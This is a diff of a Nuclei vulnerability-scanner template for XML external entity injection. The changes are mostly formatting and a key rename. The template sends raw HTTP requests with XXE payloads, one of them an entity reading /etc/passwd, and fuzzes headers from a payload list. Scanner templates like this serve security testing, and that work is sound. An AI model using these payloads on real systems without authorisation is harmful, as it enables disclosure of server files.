@@ -1,11 +1,12 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: XXE-LFI
 
 info:
   name: XXE
   author: MRiambatman
   severity: critical
-  
-requests:
+
+http:
   - raw:
       - |
         GET / HTTP/1.1
@@ -15,12 +16,12 @@ requests:
         <!DOCTYPE xxe [
         <!ELEMENT name ANY >
         <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-        
+
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/xml
-        
+
         <!DOCTYPE root [
         <!ENTITY stuff SYSTEM ".">
         ]><root>&stuff;</root>
@@ -36,14 +37,14 @@ requests:
         Host: {{Hostname}}
         Content-Type: application/xml
         §header§
- 
+
       - |
         PUT / HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/xml
         §header§
-        
-    payloads: 
+
+    payloads:
       header: helpers/payloads/xxe.txt
     attack: clusterbomb
     redirects: true
